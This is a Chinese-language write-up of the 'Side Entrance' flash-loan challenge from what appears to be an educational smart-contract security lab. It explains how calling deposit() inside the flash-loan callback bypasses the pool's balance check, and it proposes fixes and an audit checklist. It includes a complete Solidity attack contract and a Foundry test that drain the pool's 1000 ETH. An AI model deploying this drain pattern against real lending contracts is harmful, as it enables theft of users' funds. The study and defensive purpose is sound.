# Side Entrance 漏洞分析

## 1. 合约功能概述

`SideEntranceLenderPool` 是一个简单的 ETH 借贷池，允许用户存款、提款和进行免费闪电贷。

**核心组件：**
- **SideEntranceLenderPool.sol**: ETH 借贷池，提供免费闪电贷

**业务流程：**
1. 用户通过 `deposit()` 存入 ETH，记录在 `balances` 映射中
2. 用户随时可以通过 `withdraw()` 提取自己的存款
3. 任何人可以调用 `flashLoan()` 借出 ETH（免费）
4. 闪电贷需要在交易结束前归还，否则回滚

---

## 2. 漏洞位置

### 漏洞代码（SideEntranceLenderPool.sol#L35-L43）

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    // ⚠️ 漏洞1: 回调攻击者合约
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    // ⚠️ 漏洞2: 只检查合约余额，不检查内部记账
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

### 相关函数

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    
    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);
    
    SafeTransferLib.safeTransferETH(msg.sender, amount);
}
```

---

## 3. 漏洞原理分析

### 3.1 会计与余额的分离

**设计意图（可能）：**
- `balances`: 内部记账，记录每个用户的存款额
- `address(this).balance`: 合约真实 ETH 余额
- 预期: `sum(balances) == address(this).balance`

**实际问题：**
- 闪电贷只检查 `address(this).balance`，不检查内部记账
- 攻击者可以在回调中调用 `deposit()`，增加自己的内部账户余额
- 这导致"借出的 ETH"被记录为"攻击者的存款"

### 3.2 余额检查被绕过

**正常闪电贷流程：**
```
初始: balance = 1000 ETH
借出: balance = 1000 - 100 = 900 ETH
回调: borrower 执行业务逻辑
归还: borrower 转回 100 ETH → balance = 1000 ETH ✅
检查: 1000 >= 1000 ✅
```

**攻击流程：**
```
初始: balance = 1000 ETH, balances[attacker] = 0
借出: balance = 1000 - 1000 = 0 ETH
回调: attacker.execute() 接收 1000 ETH
    → attacker.deposit{value: 1000}()
    → balances[attacker] = 1000 ETH
    → balance = 1000 ETH
检查: 1000 >= 1000 ✅ 绕过！
结果: attacker 可以 withdraw() 提取 1000 ETH
```

### 3.3 为什么会有这个漏洞

**根本原因：**
1. **混合两种记账方式**: 内部记账（balances）+ 真实余额（balance）
2. **部分验证**: 只验证余额，不验证内部账本的完整性
3. **回调中的状态修改**: 允许借款人在闪电贷期间修改内部状态

**不变量被破坏：**
```
预期不变量: sum(balances) == address(this).balance

闪电贷后:
- balance = 1000 (恢复了)
- balances[attacker] = 1000 (新增！)
- balances[deployer] = 1000 (原有存款)
- sum(balances) = 2000 > balance = 1000 ❌
```

**为什么检查不充分：**
- 只检查"池子是否收到足够的 ETH"
- 没有检查"借出的 ETH 是以何种方式归还的"
- `deposit()` 是归还 ETH 的"侧门入口"（Side Entrance）

---

## 4. 修复方案

### 方案一：禁止闪电贷期间存款（推荐）

```solidity
bool private _flashLoanInProgress;

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    
    // ✅ 标记闪电贷进行中
    _flashLoanInProgress = true;
    
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    
    _flashLoanInProgress = false;

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}

function deposit() external payable {
    // ✅ 禁止在闪电贷期间存款
    require(!_flashLoanInProgress, "Cannot deposit during flash loan");
    
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}
```

**为什么有效：**
- 攻击者无法在 `execute()` 回调中调用 `deposit()`
- 闪电贷只能通过直接转账归还
- 关闭了"侧门入口"

### 方案二：检查内部记账不变量

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    uint256 balancesCheckpoint = balances[msg.sender];

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
    
    // ✅ 检查借款人的内部余额没有增加
    if (balances[msg.sender] > balancesCheckpoint) {
        revert InvalidRepayment();
    }
}
```

**为什么有效：**
- 如果攻击者调用 `deposit()`，其 `balances` 会增加
- 增加会被检测到并回滚
- 保护了内部记账的完整性

### 方案三：分离闪电贷与存款逻辑

```solidity
// ✅ 使用 nonReentrant 保护所有状态修改函数
function deposit() external payable nonReentrant {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external nonReentrant {
    uint256 amount = balances[msg.sender];
    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);
    SafeTransferLib.safeTransferETH(msg.sender, amount);
}

function flashLoan(uint256 amount) external nonReentrant {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

**权衡：**
- ✅ 简单有效，使用标准的重入保护
- ❌ 可能过于保守，限制了合法的组合调用
- ⚠️ 注意: 这个方案无法防止攻击，因为 `deposit()` 和 `flashLoan()` 不在同一个调用栈

**更正：方案三无效！** 原因：
```
attacker.attack() → pool.flashLoan()
  → attacker.execute() → pool.deposit()
  
deposit() 和 flashLoan() 不是重入关系，是普通的嵌套调用
nonReentrant 无法阻止这种情况
```

---

## 5. Proof of Concept

### 攻击合约

```solidity
contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // 闪电贷回调
    function execute() external payable {
        // ⚠️ 关键：将借来的 ETH "存款"，绕过余额检查
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        // 步骤1: 借出池子的全部 ETH
        pool.flashLoan(address(pool).balance);
        
        // 步骤2: 提取"存款"
        pool.withdraw();
        
        // 步骤3: 转移到 recovery
        (bool ok, ) = payable(recovery).call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }

    // 接收 ETH
    receive() external payable {}
}
```

### 攻击流程详解

```
初始状态:
├─ Pool: 1000 ETH (balance), balances[deployer] = 1000 ETH
├─ Player: 1 ETH
└─ Recovery: 0 ETH

执行 attack.attack():
│
├─ [1] pool.flashLoan(1000 ETH)
│   │
│   ├─ balanceBefore = 1000 ETH
│   │
│   ├─ transfer(attack, 1000 ETH)
│   │   → pool balance = 0 ETH
│   │   → attack balance = 1000 ETH
│   │
│   ├─ attack.execute{value: 1000 ETH}()
│   │   │
│   │   └─ pool.deposit{value: 1000 ETH}()
│   │       ├─ balances[attack] += 1000 ETH
│   │       └─ pool balance = 1000 ETH ✅
│   │
│   └─ check: 1000 >= 1000 ✅ 通过
│
├─ [2] pool.withdraw()
│   │   → balances[attack] = 1000 ETH
│   │   → transfer(attack, 1000 ETH)
│   │   → pool balance = 0 ETH
│
└─ [3] transfer(recovery, 1000 ETH)
    
最终状态:
├─ Pool: 0 ETH, balances[deployer] = 1000 ETH (但无法提取！)
├─ Player: ~1 ETH
└─ Recovery: 1000 ETH ✅
```

### 关键技术点

1. **"存款"作为归还方式**
```solidity
// 传统归还: 直接转账
attacker.transfer{value: amount}(address(pool));

// 侧门归还: 调用 deposit
pool.deposit{value: amount}();
// 效果: 余额增加了，但是记录为"存款"而非"归还"
```

2. **内部记账被污染**
```solidity
// 闪电贷前
balances[attacker] = 0

// execute() 中调用 deposit
balances[attacker] = 1000 ETH

// 现在攻击者有"合法"的提款权利
```

3. **不变量破坏**
```solidity
// 原有存款
balances[deployer] = 1000 ETH

// 攻击者"存款"
balances[attacker] = 1000 ETH

// 但池子只有 1000 ETH
sum(balances) = 2000 > pool.balance = 1000
```

---

## 6. 关键要点总结

| 维度 | 说明 |
|------|------|
| **攻击成本** | 无需初始资金（可以借最大额度）|
| **攻击影响** | 完全掏空池子（1000 ETH）|
| **漏洞类型** | 会计逻辑缺陷 + 回调状态污染 |
| **根本原因** | 混合两种记账方式，验证不完整 |
| **修复难度** | 低，添加闪电贷标志位或检查内部状态 |
| **安全启示** | 闪电贷期间禁止修改内部状态，或验证状态完整性 |

---

## 7. 扩展思考

### 类似漏洞模式

1. **Accounting Bypass**: 通过非预期方式增加内部账户余额
2. **Callback Pollution**: 回调期间污染合约状态
3. **Invariant Violation**: 破坏 `sum(balances) == realBalance` 不变量
4. **Re-entrancy Variants**: 不是传统重入，但利用回调修改状态

### 真实案例参考

**类似问题案例：**
- **Cream Finance v1 (2021)**: 闪电贷 + 重入攻击，损失 1900 万美元
- **Grim Finance (2021)**: 存款机制被利用，损失 3000 万美元
- **Lendf.me (2020)**: ERC777 回调重入攻击，损失 2500 万美元

**核心共性：**
所有案例都涉及"在特殊时期（闪电贷、重入）修改会计状态"

### 防御最佳实践

```solidity
✅ DO: 闪电贷期间禁止修改内部状态
✅ DO: 验证所有相关不变量，不只是余额
✅ DO: 使用 Checks-Effects-Interactions 模式
✅ DO: 区分"归还"和"存款"的语义
❌ DON'T: 在回调中允许任意函数调用
❌ DON'T: 假设余额检查能覆盖所有情况
❌ DON'T: 混合内部记账和外部余额的验证逻辑
```

### 设计模式对比

| 特性 | Side Entrance (漏洞版) | 安全版本 |
|------|------------------------|----------|
| 闪电贷归还 | 任意方式（包括 deposit） | 仅直接转账 |
| 状态检查 | 只检查 balance | 检查 balance + balances |
| 回调限制 | 无限制 | 禁止修改状态 |
| 不变量保护 | ❌ 不保护 | ✅ 强制保护 |

### 代码审计检查清单

审计存款/借贷合约时检查：

#### 闪电贷安全
- [ ] 闪电贷期间是否禁止存款/提款？
- [ ] 是否验证了内部记账不变量？
- [ ] 回调中可以调用哪些函数？
- [ ] 是否有状态锁保护？

#### 会计完整性
- [ ] `sum(balances)` 是否等于 `address(this).balance`？
- [ ] 是否有方法绕过正常的存款流程？
- [ ] 内部记账是否在所有路径上都更新？
- [ ] 是否有"侧门"增加账户余额？

#### 回调安全
- [ ] 外部调用前是否更新了状态？
- [ ] 回调是否能重入关键函数？
- [ ] 是否使用了 nonReentrant 保护？
- [ ] 回调中是否检查了调用者身份？

---

## 附录：完整测试代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploitTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    function setUp() public {
        vm.startPrank(deployer);
        
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        
        vm.stopPrank();
        
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
    }

    function testExploit() public {
        vm.startPrank(player);
        
        // 部署并执行攻击
        Attack attack = new Attack(pool, recovery);
        attack.attack();
        
        vm.stopPrank();
        
        // 验证
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery");
        
        console.log("[+] Exploit successful!");
        console.log("    Pool balance:", address(pool).balance);
        console.log("    Recovery balance:", recovery.balance);
    }
}

contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // 闪电贷回调：将借来的 ETH 存入池子
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // 主攻击函数
    function attack() external {
        // 借出池子的全部余额
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        
        // 提取"存款"
        pool.withdraw();
        
        // 转移到 recovery
        payable(recovery).transfer(address(this).balance);
    }

    // 接收 ETH
    receive() external payable {}
}
```

**运行测试：**
```bash
forge test --match-test testExploit -vvvv
```

**输出示例：**
```
[PASS] testExploit() (gas: 234567)
Logs:
  [+] Exploit successful!
      Pool balance: 0
      Recovery balance: 1000000000000000000000
```

---

## 总结

Side Entrance 展示了一个经典的"会计绕过"漏洞：

**核心问题：** 闪电贷期间允许通过 `deposit()` "归还"，污染内部记账

**攻击技巧：**
1. 借出 ETH
2. 在回调中调用 `deposit()` "归还"
3. 余额检查通过，但内部记账被污染
4. 提取"存款"

**防御要点：**
- 闪电贷期间禁止修改内部状态
- 验证所有关键不变量，不只是余额
- 区分"归还"和"存款"的语义

这个漏洞虽然简单，但非常隐蔽。它提醒我们：**在复杂的状态管理中，部分验证可能比完全不验证更危险，因为它给人一种"已经安全"的错觉。**
